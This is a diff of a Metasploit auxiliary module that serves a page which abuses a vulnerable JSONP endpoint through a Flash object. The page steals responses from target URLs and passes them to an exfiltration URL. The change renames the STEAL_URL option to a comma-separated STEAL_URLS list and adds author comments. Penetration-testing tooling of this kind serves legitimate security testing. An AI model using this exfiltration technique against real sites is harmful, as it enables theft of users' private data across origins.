@@ -22,12 +22,12 @@ class Metasploit3 < Msf::Auxiliary
 
         This module spins up a web server that, upon navigation from a user, attempts
         to abuse the specified JSONP endpoint URLs by stealing the response from
-        GET requests to STEAL_URL.
+        GET requests to STEAL_URLS.
       },
       'License'        => MSF_LICENSE,
       'Author'         => [
-        'Michele Spagnuolo',
-        'joev'
+        'Michele Spagnuolo', # discovery, wrote rosetta encoder, disclosure
+        'joev' # msf module
       ],
       'References'     =>
         [
@@ -45,9 +45,8 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('CALLBACK', [ true, 'The name of the callback paramater', 'callback' ]),
         OptString.new('JSONP_URL', [ true, 'The URL of the vulnerable JSONP endpoint', '' ]),
-        OptString.new('STEAL_URL', [ true, 'The URL to steal the contents of', '' ]),
         OptBool.new('CHECK', [ true, 'Check first that the JSONP endpoint works', true ]),
-        OptString.new('STEAL_URL', [ true, 'The URL to steal the contents of', '' ]),
+        OptString.new('STEAL_URLS', [ true, 'A comma-separated list of URLs to steal', '' ]),
         OptString.new('URIPATH', [ true, 'The URI path to serve the exploit under', '/' ])
       ],
       self.class)
@@ -113,7 +112,7 @@ class Metasploit3 < Msf::Auxiliary
           <object type="application/x-shockwave-flash" data="#{exploit_url(encoded_swf)}"
             width=500 height=500>
             <param name="FlashVars"
-              value="url=#{URI.escape datastore['STEAL_URL']}&exfiltrate=#{ex_url}" />
+              value="url=#{URI.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
           </object>
         </body>
       </html>
